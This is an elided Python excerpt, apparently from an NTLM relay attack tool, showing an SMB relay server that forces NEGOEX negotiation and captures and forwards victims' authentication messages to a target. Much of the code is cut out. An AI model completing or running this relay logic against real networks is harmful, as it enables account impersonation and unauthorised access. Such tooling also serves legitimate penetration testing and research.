...
class SMBRelayServer(Thread):
    ...
    def SmbSessionSetup(self, connId, smbServer, recvPacket):
        ...
        if struct.unpack('B',securityBlob[0:1])[0] == ASN1_AID:
           ...
           if len(blob['MechTypes'][0]) > 0:
               ...
               if mechType != TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']:
                   # Nope, do we know it?
                   ...
                   respToken['SupportedMech'] = TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']
        ...
        # here we handle to auth
        # need to parse and act based on the request
        ...
        if NegoExMessageType.MESSAGE_TYPE_VERIFY in messageTypes:
            ...
            if ('attackStarted' not in connData.keys()):
                connData['attackStarted'] = True
            ...
            connData['AUTHENTICATE_MESSAGE'] = clientResponse
        else:
            self.do_nego_negotiate(client, securityBlob)
            ...
            connData['CHALLENGE_MESSAGE'] = securityBlob

        respSMBCommand['SecurityBufferOffset'] = 0x48
        respSMBCommand['SecurityBufferLength'] = len(client.serverChallenge)
        if respSMBCommand['SecurityBufferLength'] > 0:
            respSMBCommand['Buffer'] = client.serverChallenge
        else:
    ...
    def do_nego_negotiate(self,client,token):
        #Since the clients all support the same operations there is no target protocol specific code needed for now
        client.sendNegoNegotiate(token)
    ...
    def do_nego_auth(self, client, SPNEGO_token, challenge):
        # The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        clientResponse, errorCode = client.sendNegoAuth(SPNEGO_token, challenge)
